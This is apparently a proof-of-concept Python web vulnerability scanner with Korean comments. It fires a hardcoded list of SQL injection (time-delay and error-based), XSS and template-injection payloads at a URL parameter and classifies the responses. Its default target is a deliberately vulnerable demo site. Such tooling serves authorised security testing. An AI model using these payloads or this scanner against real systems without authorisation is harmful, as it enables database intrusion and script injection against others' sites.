import time
from typing import Dict, List
import os
import sys

# 프로젝트 루트 디렉토리를 파이썬 경로에 추가
project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if project_root not in sys.path:
    sys.path.append(project_root)

from poc_fuzzmap.scanner import FuzzScanner
from poc_fuzzmap.models import *

def main(url: str = "http://testphp.vulnweb.com/listproducts.php", param: str = "cat"):
    """메인 실행 함수"""
    scanner = FuzzScanner(url, param)
    
    # 기본 응답 길이 측정을 위한 테스트 요청
    test_response = scanner._send_payload("test")
    original_length = len(test_response.text)
    
    print(f"[+] 스캔 시작 - {url}")
    print("\n[+] 공통 페이로드 결과")
    
    # 공통 페이로드 목록
    common_payloads = [
        "'",
        '"',
        "a' or 1=1 -- -;<img src=x>//",
        "a' or 1>1 -- -;<img src=x>//",
        "' OR WAITFOR DELAY \"00:00:05\" --",
        "' AND SLEEP(5)/*",
        "SLEEP(3) /*' or SLEEP(3) or '\" or SLEEP(3) or \"*/",
        "\"' AND IF(1=1,SLEEP(5),0)--",
        "' OR pg_sleep(5)",
        "' OR BEGIN DBMS_LOCK.SLEEP(5); END;--",
        "' || BEGIN DBMS_SESSION.SLEEP(5); END; --",
        "<svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(1);//'>",
        "';}<h1>test</h1>//",
        "'\"<script>{{7*7}}</script><!---",
        "<img src=x onerror='javascript:alert(6)'>",
        "<img src='a' alt=\"test\" onload=javascript%3Aalert`6`>",
        "/**/a';${7*7};'--%20-",
        "/*!SLEEP(3)/*/alert(1)/*/*/",
        "'\"<script>#{7*7};alert(1)</script><img src=x onerror=alert(2)><!--",
        "\" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//"
    ]
    
    # 심화 페이로드 목록
    deep_scan_payloads = {
        "mssql": ["' AND 1=CONVERT(int,(SELECT @@version)) --"],
        "xss": [";</><iframe src=javascript:alert(1)></iframe>//"]
    }
    
    vulnerabilities: Dict[VulnType, Dict] = {}  # 취약점 정보 저장
    confirmed_payloads: Dict[VulnType, List[str]] = {}  # 확인된 페이로드 저장
    
    for payload in common_payloads:
        start_time = time.time()
        response = scanner._send_payload(payload)
        detections = scanner._analyze_response(response, original_length, start_time)
        
        if detections:
            print(f"\n페이로드: {payload}")
            for detection in detections:
                vuln_type = None
                
                # 탐지 유형에 따른 취약점 분류
                if detection.condition in [DetectionType.SQL_ERROR, 
                                        DetectionType.TIME_DELAY,
                                        DetectionType.VERSION_DISCLOSURE,
                                        DetectionType.RESPONSE_LENGTH_DIFF]:
                    vuln_type = VulnType.SQL_INJECTION
                elif detection.condition in [DetectionType.ALERT_TRIGGERED,
                                          DetectionType.HTML_TAG_UNFILTERED]:
                    vuln_type = VulnType.XSS
                elif detection.condition == DetectionType.CALCULATION_RESULT:
                    vuln_type = VulnType.SSTI
                
                if vuln_type:
                    if vuln_type not in vulnerabilities:
                        vulnerabilities[vuln_type] = {
                            'confidence': 0.0,
                            'evidence': [],
                            'confirmed': False
                        }
                        confirmed_payloads[vuln_type] = []
                    
                    # 100% 신뢰도이거나 이전 신뢰도보다 높은 경우 업데이트
                    if (detection.confidence == 100.0 or 
                        detection.confidence > vulnerabilities[vuln_type]['confidence']):
                        vulnerabilities[vuln_type]['confidence'] = detection.confidence
                        vulnerabilities[vuln_type]['evidence'].append(detection.evidence)
                        confirmed_payloads[vuln_type].append(payload)
                        
                        if detection.confidence == 100.0:
                            vulnerabilities[vuln_type]['confirmed'] = True
                
                print(f"탐지 유형: {detection.condition.value}")
                print(f"신뢰도: {detection.confidence}%")
                print(f"근거: {detection.evidence}")
                print("-" * 50)
            
            # 심화 스캔 필요 여부 확인 (100% 신뢰도가 아닌 경우만)
            if (scanner.needs_deep_scan(detections) and 
                not any(v['confirmed'] for v in vulnerabilities.values())):
                print("\n[+] 심화 페이로드 스캔 시작")
                
                # SQL Injection 심화 스캔
                if (VulnType.SQL_INJECTION in vulnerabilities and 
                    not vulnerabilities[VulnType.SQL_INJECTION]['confirmed']):
                    for deep_payload in deep_scan_payloads["mssql"]:
                        start_time = time.time()
                        response = scanner._send_payload(deep_payload)
                        deep_detections = scanner._analyze_response(
                            response, original_length, start_time
                        )
                        
                        for detection in deep_detections:
                            if detection.confidence == 100.0:
                                vulnerabilities[VulnType.SQL_INJECTION]['confirmed'] = True
                                vulnerabilities[VulnType.SQL_INJECTION]['confidence'] = 100.0
                                vulnerabilities[VulnType.SQL_INJECTION]['evidence'].append(
                                    detection.evidence
                                )
                                confirmed_payloads[VulnType.SQL_INJECTION].append(deep_payload)
                                print(f"\n[+] SQL Injection 취약점 확인됨")
                                print(f"페이로드: {deep_payload}")
                                print(f"근거: {detection.evidence}")
                
                # XSS 심화 스캔
                if (VulnType.XSS in vulnerabilities and 
                    not vulnerabilities[VulnType.XSS]['confirmed']):
                    for deep_payload in deep_scan_payloads["xss"]:
                        start_time = time.time()
                        response = scanner._send_payload(deep_payload)
                        deep_detections = scanner._analyze_response(
                            response, original_length, start_time
                        )
                        
                        for detection in deep_detections:
                            if detection.condition == DetectionType.ALERT_TRIGGERED:
                                vulnerabilities[VulnType.XSS]['confirmed'] = True
                                vulnerabilities[VulnType.XSS]['confidence'] = 100.0
                                vulnerabilities[VulnType.XSS]['evidence'].append(
                                    f"Alert execution confirmed with payload: {deep_payload}"
                                )
                                confirmed_payloads[VulnType.XSS].append(deep_payload)
                                print(f"\n[+] XSS 취약점 확인됨")
                                print(f"페이로드: {deep_payload}")
                                print(f"근거: {detection.evidence}")

    # 최종 결과 출력
    print("\n[+] 스캔 완료")
    print("\n[+] 취약점 요약")
    for vuln_type, info in vulnerabilities.items():
        print(f"취약점 유형: {vuln_type.value}")
        print(f"최종 신뢰도: {100.0 if info['confirmed'] else info['confidence']}%")
        print("탐지 근거:")
        for evidence in info['evidence']:
            print(f"  - {evidence}")
        print("확인된 페이로드:")
        for payload in confirmed_payloads[vuln_type]:
            print(f"  - {payload}")
        print("-" * 50)

if __name__ == "__main__":
    main() 